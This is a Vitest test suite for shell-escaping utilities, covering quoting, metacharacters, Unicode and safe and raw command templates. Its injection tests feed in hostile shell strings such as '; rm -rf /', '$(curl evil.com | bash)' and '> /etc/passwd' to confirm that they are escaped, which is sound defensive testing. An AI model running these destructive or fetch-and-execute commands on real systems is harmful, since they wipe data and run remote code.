/**
 * Shell Escape Utility Tests - RED Phase
 *
 * Comprehensive test suite for shell escaping utilities.
 * These tests are designed to verify correct escaping of all
 * potentially dangerous shell characters.
 *
 * @packageDocumentation
 */

import { describe, it, expect } from 'vitest'
import {
  shellEscape,
  shellEscapeArg,
  createShellTemplate,
  rawTemplate,
  safeTemplate,
} from '../../../src/escape.js'

describe('Shell Escape Utilities', () => {
  /**
   * Single Quote Escaping
   * Single quotes in shell are tricky - they preserve everything literally
   * except you can't include a single quote inside single quotes.
   * The solution is to end the quote, add an escaped quote, and restart.
   */
  describe('Single Quote Escaping', () => {
    it("should escape O'Brien correctly", () => {
      // O'Brien should become 'O'\''Brien' (end quote, escaped quote, start quote)
      const result = shellEscapeArg("O'Brien")
      expect(result).toBe("'O'\"'\"'Brien'")
    })

    it("should escape it's correctly", () => {
      const result = shellEscapeArg("it's")
      expect(result).toBe("'it'\"'\"'s'")
    })

    it('should escape multiple single quotes', () => {
      const result = shellEscapeArg("don't won't can't")
      expect(result).toBe("'don'\"'\"'t won'\"'\"'t can'\"'\"'t'")
    })

    it('should escape consecutive single quotes', () => {
      const result = shellEscapeArg("a''b")
      expect(result).toBe("'a'\"'\"''\"'\"'b'")
    })

    it('should escape string that is just a single quote', () => {
      const result = shellEscapeArg("'")
      expect(result).toBe("''\"'\"''")
    })

    it('should escape string starting with single quote', () => {
      const result = shellEscapeArg("'hello")
      expect(result).toBe("''\"'\"'hello'")
    })

    it('should escape string ending with single quote', () => {
      const result = shellEscapeArg("hello'")
      expect(result).toBe("'hello'\"'\"''")
    })
  })

  /**
   * Double Quote Escaping
   * In single-quoted strings, double quotes are preserved literally.
   */
  describe('Double Quote Escaping', () => {
    it('should preserve double quotes in single-quoted output', () => {
      const result = shellEscapeArg('"hello"')
      expect(result).toBe('\'"hello"\'')
    })

    it('should handle nested quotes', () => {
      const result = shellEscapeArg("He said \"hello\"")
      expect(result).toBe("'He said \"hello\"'")
    })

    it('should handle mixed single and double quotes', () => {
      const result = shellEscapeArg("He said \"it's fine\"")
      expect(result).toBe("'He said \"it'\"'\"'s fine\"'")
    })

    it('should handle string with only double quotes', () => {
      const result = shellEscapeArg('""')
      expect(result).toBe('\'""\'')
    })

    it('should handle escaped double quotes in input', () => {
      const result = shellEscapeArg('\\"escaped\\"')
      expect(result).toBe("'\\\"escaped\\\"'")
    })
  })

  /**
   * Backtick Escaping
   * Backticks are command substitution in shell - must be escaped.
   */
  describe('Backtick Escaping', () => {
    it('should escape simple backtick command', () => {
      const result = shellEscapeArg('`cmd`')
      expect(result).toBe("'`cmd`'")
    })

    it('should escape backtick with complex command', () => {
      const result = shellEscapeArg('`whoami`')
      expect(result).toBe("'`whoami`'")
    })

    it('should escape nested backticks', () => {
      const result = shellEscapeArg('`echo `date``')
      expect(result).toBe("'`echo `date``'")
    })

    it('should escape backtick at start of string', () => {
      const result = shellEscapeArg('`start')
      expect(result).toBe("'`start'")
    })

    it('should escape backtick at end of string', () => {
      const result = shellEscapeArg('end`')
      expect(result).toBe("'end`'")
    })

    it('should escape string with only backticks', () => {
      const result = shellEscapeArg('``')
      expect(result).toBe("'``'")
    })
  })

  /**
   * Special Characters
   * Test all shell metacharacters that need escaping.
   */
  describe('Special Characters', () => {
    it('should escape dollar sign (variable expansion)', () => {
      const result = shellEscapeArg('$HOME')
      expect(result).toBe("'$HOME'")
    })

    it('should escape dollar with braces (variable expansion)', () => {
      const result = shellEscapeArg('${HOME}')
      expect(result).toBe("'${HOME}'")
    })

    it('should escape dollar with parentheses (command substitution)', () => {
      const result = shellEscapeArg('$(whoami)')
      expect(result).toBe("'$(whoami)'")
    })

    it('should escape backslash', () => {
      const result = shellEscapeArg('path\\file')
      expect(result).toBe("'path\\file'")
    })

    it('should escape multiple backslashes', () => {
      const result = shellEscapeArg('a\\b\\c')
      expect(result).toBe("'a\\b\\c'")
    })

    it('should escape exclamation mark (history expansion)', () => {
      const result = shellEscapeArg('hello!')
      expect(result).toBe("'hello!'")
    })

    it('should escape double exclamation (repeat last command)', () => {
      const result = shellEscapeArg('!!')
      expect(result).toBe("'!!'")
    })

    it('should escape newline character', () => {
      const result = shellEscapeArg('line1\nline2')
      expect(result).toBe("'line1\nline2'")
    })

    it('should escape tab character', () => {
      const result = shellEscapeArg('col1\tcol2')
      expect(result).toBe("'col1\tcol2'")
    })

    it('should escape carriage return', () => {
      const result = shellEscapeArg('line1\rline2')
      expect(result).toBe("'line1\rline2'")
    })

    it('should escape CRLF', () => {
      const result = shellEscapeArg('line1\r\nline2')
      expect(result).toBe("'line1\r\nline2'")
    })

    it('should escape semicolon (command separator)', () => {
      const result = shellEscapeArg('cmd1;cmd2')
      expect(result).toBe("'cmd1;cmd2'")
    })

    it('should escape ampersand (background)', () => {
      const result = shellEscapeArg('cmd &')
      expect(result).toBe("'cmd &'")
    })

    it('should escape double ampersand (AND)', () => {
      const result = shellEscapeArg('cmd1 && cmd2')
      expect(result).toBe("'cmd1 && cmd2'")
    })

    it('should escape pipe (piping)', () => {
      const result = shellEscapeArg('cmd1 | cmd2')
      expect(result).toBe("'cmd1 | cmd2'")
    })

    it('should escape double pipe (OR)', () => {
      const result = shellEscapeArg('cmd1 || cmd2')
      expect(result).toBe("'cmd1 || cmd2'")
    })

    it('should escape redirect output', () => {
      const result = shellEscapeArg('cmd > file')
      expect(result).toBe("'cmd > file'")
    })

    it('should escape redirect input', () => {
      const result = shellEscapeArg('cmd < file')
      expect(result).toBe("'cmd < file'")
    })

    it('should escape append redirect', () => {
      const result = shellEscapeArg('cmd >> file')
      expect(result).toBe("'cmd >> file'")
    })

    it('should escape stderr redirect', () => {
      const result = shellEscapeArg('2>&1')
      expect(result).toBe("'2>&1'")
    })

    it('should escape glob asterisk', () => {
      const result = shellEscapeArg('*.txt')
      expect(result).toBe("'*.txt'")
    })

    it('should escape glob question mark', () => {
      const result = shellEscapeArg('file?.txt')
      expect(result).toBe("'file?.txt'")
    })

    it('should escape glob brackets', () => {
      const result = shellEscapeArg('[abc].txt')
      expect(result).toBe("'[abc].txt'")
    })

    it('should escape glob braces', () => {
      const result = shellEscapeArg('{a,b}.txt')
      expect(result).toBe("'{a,b}.txt'")
    })

    it('should escape tilde (home directory)', () => {
      const result = shellEscapeArg('~/file')
      expect(result).toBe("'~/file'")
    })

    it('should escape hash (comment)', () => {
      const result = shellEscapeArg('# comment')
      expect(result).toBe("'# comment'")
    })

    it('should escape parentheses (subshell)', () => {
      const result = shellEscapeArg('(cmd)')
      expect(result).toBe("'(cmd)'")
    })

    it('should escape curly braces (grouping)', () => {
      const result = shellEscapeArg('{ cmd; }')
      expect(result).toBe("'{ cmd; }'")
    })
  })

  /**
   * Spaces and Whitespace
   * Whitespace requires quoting to prevent word splitting.
   */
  describe('Spaces and Whitespace', () => {
    it('should quote string with single space', () => {
      const result = shellEscapeArg('hello world')
      expect(result).toBe("'hello world'")
    })

    it('should quote string with multiple spaces', () => {
      const result = shellEscapeArg('hello   world')
      expect(result).toBe("'hello   world'")
    })

    it('should quote string with leading space', () => {
      const result = shellEscapeArg(' hello')
      expect(result).toBe("' hello'")
    })

    it('should quote string with trailing space', () => {
      const result = shellEscapeArg('hello ')
      expect(result).toBe("'hello '")
    })

    it('should quote string with only spaces', () => {
      const result = shellEscapeArg('   ')
      expect(result).toBe("'   '")
    })

    it('should quote string with tab', () => {
      const result = shellEscapeArg('hello\tworld')
      expect(result).toBe("'hello\tworld'")
    })

    it('should quote string with multiple whitespace types', () => {
      const result = shellEscapeArg('hello \t world')
      expect(result).toBe("'hello \t world'")
    })

    it('should quote string with vertical tab', () => {
      const result = shellEscapeArg('hello\vworld')
      expect(result).toBe("'hello\vworld'")
    })

    it('should quote string with form feed', () => {
      const result = shellEscapeArg('hello\fworld')
      expect(result).toBe("'hello\fworld'")
    })
  })

  /**
   * Unicode Characters
   * Test various Unicode characters including emoji, CJK, RTL.
   */
  describe('Unicode Characters', () => {
    it('should handle emoji', () => {
      const result = shellEscapeArg('hello world')
      // Emoji contains special characters that need quoting
      expect(result).toBe("'hello world'")
    })

    it('should handle multiple emoji', () => {
      const result = shellEscapeArg('📁file.txt')
      expect(result).toBe("'📁file.txt'")
    })

    it('should handle CJK characters', () => {
      const result = shellEscapeArg('测试test.txt')
      // Chinese characters need quoting
      expect(result).toBe("'测试test.txt'")
    })

    it('should handle Japanese hiragana', () => {
      const result = shellEscapeArg('こんにちはhello.txt')
      expect(result).toBe("'こんにちはhello.txt'")
    })

    it('should handle Korean hangul', () => {
      const result = shellEscapeArg('테스트test.txt')
      expect(result).toBe("'테스트test.txt'")
    })

    it('should handle RTL Arabic characters', () => {
      const result = shellEscapeArg('اختبارtest.txt')
      expect(result).toBe("'اختبارtest.txt'")
    })

    it('should handle RTL Hebrew characters', () => {
      const result = shellEscapeArg('בדיקהtest.txt')
      expect(result).toBe("'בדיקהtest.txt'")
    })

    it('should handle combining characters', () => {
      const result = shellEscapeArg('cafe\u0301.txt') // cafe + combining acute
      expect(result).toBe("'cafe\u0301.txt'")
    })

    it('should handle zero-width characters', () => {
      const result = shellEscapeArg('a\u200Bb.txt') // zero-width space
      expect(result).toBe("'a\u200Bb.txt'")
    })

    it('should handle emoji with skin tone modifiers', () => {
      const result = shellEscapeArg('👋🏽hello')
      expect(result).toBe("'👋🏽hello'")
    })

    it('should handle emoji ZWJ sequences', () => {
      const result = shellEscapeArg('👨‍👩‍👧‍👦family.txt') // family emoji
      expect(result).toBe("'👨‍👩‍👧‍👦family.txt'")
    })

    it('should handle mathematical symbols', () => {
      const result = shellEscapeArg('∑∏∫file.txt')
      expect(result).toBe("'∑∏∫file.txt'")
    })

    it('should handle currency symbols', () => {
      const result = shellEscapeArg('€£¥price.txt')
      expect(result).toBe("'€£¥price.txt'")
    })
  })

  /**
   * Injection Prevention
   * Test that common shell injection attacks are properly escaped.
   */
  describe('Injection Prevention', () => {
    it('should escape rm -rf injection', () => {
      const result = shellEscapeArg('; rm -rf /')
      expect(result).toBe("'; rm -rf /'")
    })

    it('should escape rm -rf with newline', () => {
      const result = shellEscapeArg('\nrm -rf /')
      expect(result).toBe("'\nrm -rf /'")
    })

    it('should escape command substitution injection', () => {
      const result = shellEscapeArg('$(rm -rf /)')
      expect(result).toBe("'$(rm -rf /)'")
    })

    it('should escape backtick injection', () => {
      const result = shellEscapeArg('`rm -rf /`')
      expect(result).toBe("'`rm -rf /`'")
    })

    it('should escape pipe to shell', () => {
      const result = shellEscapeArg('| sh')
      expect(result).toBe("'| sh'")
    })

    it('should escape background execution', () => {
      const result = shellEscapeArg('& rm -rf /')
      expect(result).toBe("'& rm -rf /'")
    })

    it('should escape redirect to sensitive file', () => {
      const result = shellEscapeArg('> /etc/passwd')
      expect(result).toBe("'> /etc/passwd'")
    })

    it('should escape sourcing malicious file', () => {
      const result = shellEscapeArg('. /tmp/evil')
      expect(result).toBe("'. /tmp/evil'")
    })

    it('should escape eval injection', () => {
      const result = shellEscapeArg('$(eval "rm -rf /")')
      expect(result).toBe("'$(eval \"rm -rf /\")'")
    })

    it('should escape curl pipe bash', () => {
      const result = shellEscapeArg('$(curl evil.com | bash)')
      expect(result).toBe("'$(curl evil.com | bash)'")
    })

    it('should escape environment variable manipulation', () => {
      const result = shellEscapeArg('LD_PRELOAD=/tmp/evil.so')
      expect(result).toBe('LD_PRELOAD=/tmp/evil.so') // Safe chars
    })

    it('should escape path traversal', () => {
      const result = shellEscapeArg('../../../etc/passwd')
      expect(result).toBe('../../../etc/passwd') // Safe chars
    })

    it('should escape null byte injection', () => {
      const result = shellEscapeArg('file\x00.txt')
      expect(result).toBe("'file\x00.txt'")
    })

    it('should escape encoded newline', () => {
      const result = shellEscapeArg('file%0arm -rf /')
      expect(result).toBe("'file%0arm -rf /'")
    })

    it('should escape complex injection attempt', () => {
      const result = shellEscapeArg('"; rm -rf / #')
      expect(result).toBe("'\"; rm -rf / #'")
    })
  })

  /**
   * Round-Trip Tests
   * Verify that escaped values can be safely passed through shell.
   */
  describe('Round-Trip (escape then parse should equal original)', () => {
    it('should round-trip simple string', () => {
      const input = 'hello'
      const escaped = shellEscapeArg(input)
      // In a real shell: echo $escaped would output 'hello'
      expect(escaped).toBe('hello')
    })

    it('should round-trip string with spaces', () => {
      const input = 'hello world'
      const escaped = shellEscapeArg(input)
      expect(escaped).toBe("'hello world'")
      // When shell evaluates 'hello world', it produces: hello world
    })

    it('should round-trip string with single quotes', () => {
      const input = "it's fine"
      const escaped = shellEscapeArg(input)
      expect(escaped).toBe("'it'\"'\"'s fine'")
      // When shell evaluates 'it'"'"'s fine', it produces: it's fine
    })

    it('should round-trip string with double quotes', () => {
      const input = '"quoted"'
      const escaped = shellEscapeArg(input)
      expect(escaped).toBe('\'"quoted"\'')
    })

    it('should round-trip string with backslashes', () => {
      const input = 'path\\to\\file'
      const escaped = shellEscapeArg(input)
      expect(escaped).toBe("'path\\to\\file'")
    })

    it('should round-trip string with dollar signs', () => {
      const input = '$HOME/file'
      const escaped = shellEscapeArg(input)
      expect(escaped).toBe("'$HOME/file'")
    })

    it('should round-trip string with newlines', () => {
      const input = 'line1\nline2'
      const escaped = shellEscapeArg(input)
      expect(escaped).toBe("'line1\nline2'")
    })

    it('should round-trip string with all special chars', () => {
      const input = "!@#$%^&*()[]{}|\\:\"'<>?,./~`"
      const escaped = shellEscapeArg(input)
      // Should be properly quoted
      expect(escaped.startsWith("'") || escaped === input).toBe(true)
    })

    it('should round-trip unicode string', () => {
      const input = 'hello world'
      const escaped = shellEscapeArg(input)
      expect(escaped).toBe("'hello world'")
    })

    it('should round-trip empty string', () => {
      const input = ''
      const escaped = shellEscapeArg(input)
      expect(escaped).toBe("''")
    })
  })

  /**
   * Empty Strings and Edge Cases
   * Test boundary conditions and edge cases.
   */
  describe('Empty Strings and Edge Cases', () => {
    it('should handle empty string', () => {
      expect(shellEscapeArg('')).toBe("''")
    })

    it('should handle null bytes', () => {
      const result = shellEscapeArg('before\0after')
      expect(result).toBe("'before\0after'")
    })

    it('should handle string with only null byte', () => {
      const result = shellEscapeArg('\0')
      expect(result).toBe("'\0'")
    })

    it('should handle multiple null bytes', () => {
      const result = shellEscapeArg('\0\0\0')
      expect(result).toBe("'\0\0\0'")
    })

    it('should handle very long string', () => {
      const input = 'a'.repeat(100000)
      const result = shellEscapeArg(input)
      expect(result).toBe(input) // All alphanumeric, no quotes needed
    })

    it('should handle very long string with special chars', () => {
      const input = ' '.repeat(10000)
      const result = shellEscapeArg(input)
      expect(result).toBe("'" + input + "'")
    })

    it('should handle string of only special characters', () => {
      const result = shellEscapeArg('!@#$%^&*()')
      expect(result).toBe("'!@#$%^&*()'")
    })

    it('should handle DEL character', () => {
      const result = shellEscapeArg('before\x7Fafter')
      expect(result).toBe("'before\x7Fafter'")
    })

    it('should handle control characters', () => {
      const result = shellEscapeArg('before\x01\x02\x03after')
      expect(result).toBe("'before\x01\x02\x03after'")
    })

    it('should handle bell character', () => {
      const result = shellEscapeArg('before\x07after')
      expect(result).toBe("'before\x07after'")
    })

    it('should handle escape character', () => {
      const result = shellEscapeArg('before\x1Bafter')
      expect(result).toBe("'before\x1Bafter'")
    })

    it('should handle backspace character', () => {
      const result = shellEscapeArg('before\bafter')
      expect(result).toBe("'before\bafter'")
    })

    it('should convert number to string', () => {
      expect(shellEscapeArg(123)).toBe('123')
    })

    it('should convert negative number to string', () => {
      expect(shellEscapeArg(-123)).toBe('-123')
    })

    it('should convert float to string', () => {
      const result = shellEscapeArg(3.14)
      expect(result).toBe('3.14')
    })

    it('should convert boolean true', () => {
      expect(shellEscapeArg(true)).toBe('true')
    })

    it('should convert boolean false', () => {
      expect(shellEscapeArg(false)).toBe('false')
    })

    it('should convert null', () => {
      expect(shellEscapeArg(null)).toBe('null')
    })

    it('should convert undefined', () => {
      expect(shellEscapeArg(undefined)).toBe('undefined')
    })

    it('should convert object to string', () => {
      const result = shellEscapeArg({ foo: 'bar' })
      expect(result).toBe("'[object Object]'")
    })

    it('should convert array to string', () => {
      const result = shellEscapeArg([1, 2, 3])
      expect(result).toBe("'1,2,3'")
    })
  })

  /**
   * shellEscape (multiple arguments)
   * Test the variadic function that escapes and joins arguments.
   */
  describe('shellEscape (multiple arguments)', () => {
    it('should join simple arguments', () => {
      expect(shellEscape('ls', '-la')).toBe('ls -la')
    })

    it('should escape argument with spaces', () => {
      expect(shellEscape('cat', 'my file.txt')).toBe("cat 'my file.txt'")
    })

    it('should handle mixed safe and unsafe', () => {
      expect(shellEscape('grep', 'pattern', 'file name.txt')).toBe(
        "grep pattern 'file name.txt'"
      )
    })

    it('should handle empty arguments', () => {
      expect(shellEscape('cmd', '', 'arg')).toBe("cmd '' arg")
    })

    it('should handle no arguments', () => {
      expect(shellEscape()).toBe('')
    })

    it('should handle single argument', () => {
      expect(shellEscape('ls')).toBe('ls')
    })

    it('should escape injection in arguments', () => {
      expect(shellEscape('echo', '; rm -rf /')).toBe("echo '; rm -rf /'")
    })
  })

  /**
   * Template Functions
   * Test createShellTemplate, safeTemplate, and rawTemplate.
   */
  describe('Template Functions', () => {
    describe('safeTemplate', () => {
      it('should escape interpolated values', () => {
        const file = 'my file.txt'
        expect(safeTemplate`cat ${file}`).toBe("cat 'my file.txt'")
      })

      it('should prevent injection', () => {
        const input = '; rm -rf /'
        expect(safeTemplate`echo ${input}`).toBe("echo '; rm -rf /'")
      })

      it('should handle multiple interpolations', () => {
        const src = 'source file'
        const dst = 'dest file'
        expect(safeTemplate`cp ${src} ${dst}`).toBe("cp 'source file' 'dest file'")
      })
    })

    describe('rawTemplate', () => {
      it('should NOT escape interpolated values', () => {
        const pattern = '*.txt'
        expect(rawTemplate`find . -name ${pattern}`).toBe('find . -name *.txt')
      })

      it('should allow dangerous values (use with caution)', () => {
        const dangerous = '$(whoami)'
        expect(rawTemplate`echo ${dangerous}`).toBe('echo $(whoami)')
      })
    })

    describe('createShellTemplate', () => {
      it('should create safe template by default', () => {
        const template = createShellTemplate()
        const input = 'file; rm -rf /'
        expect(template`cat ${input}`).toBe("cat 'file; rm -rf /'")
      })

      it('should create raw template with escape: false', () => {
        const template = createShellTemplate({ escape: false })
        const pattern = '*.txt'
        expect(template`ls ${pattern}`).toBe('ls *.txt')
      })
    })
  })

  /**
   * Real-World Command Building
   * Test escaping in realistic command scenarios.
   */
  describe('Real-World Commands', () => {
    const template = createShellTemplate()

    it('should build safe git commit', () => {
      const message = "fix: handle O'Brien case"
      expect(template`git commit -m ${message}`).toBe(
        "git commit -m 'fix: handle O'\"'\"'Brien case'"
      )
    })

    it('should build safe curl with URL', () => {
      const url = 'https://api.example.com.ai/path?foo=bar&baz=qux'
      expect(template`curl ${url}`).toBe(
        "curl 'https://api.example.com.ai/path?foo=bar&baz=qux'"
      )
    })

    it('should build safe docker command', () => {
      const name = 'my-container'
      const env = "KEY=value with spaces"
      expect(template`docker run --name ${name} -e ${env} image`).toBe(
        "docker run --name my-container -e 'KEY=value with spaces' image"
      )
    })

    it('should build safe ssh command', () => {
      const host = 'user@server'
      const cmd = 'cat /etc/passwd'
      expect(template`ssh ${host} ${cmd}`).toBe(
        "ssh user@server 'cat /etc/passwd'"
      )
    })

    it('should build safe find with user input', () => {
      const name = "user's file*.txt"
      expect(template`find . -name ${name}`).toBe(
        "find . -name 'user'\"'\"'s file*.txt'"
      )
    })

    it('should build safe tar command', () => {
      const archive = 'backup 2024.tar.gz'
      const dir = 'My Documents'
      expect(template`tar -czf ${archive} ${dir}`).toBe(
        "tar -czf 'backup 2024.tar.gz' 'My Documents'"
      )
    })
  })
})
